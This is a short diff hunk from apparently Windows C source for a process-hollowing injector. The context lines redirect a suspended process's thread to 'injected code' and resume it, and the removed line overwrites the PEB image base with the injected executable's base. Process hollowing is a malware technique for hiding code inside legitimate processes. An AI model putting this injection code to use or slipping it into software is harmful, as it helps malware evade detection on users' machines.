@@ -102,9 +102,6 @@ int main()
 	/* Set the suspended exe context with the updated eax value which points to the injected code */
 	SetThreadContext(pi.hThread, lpContext);
 
-	/* Overwrite the PEB base address with the image base address of the injected exe */
-	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &baseAddress, baseAddrLength, NULL);
-
 	/* Resume the created processes main thread with the updated OEP */
 	ResumeThread(pi.hThread);
 
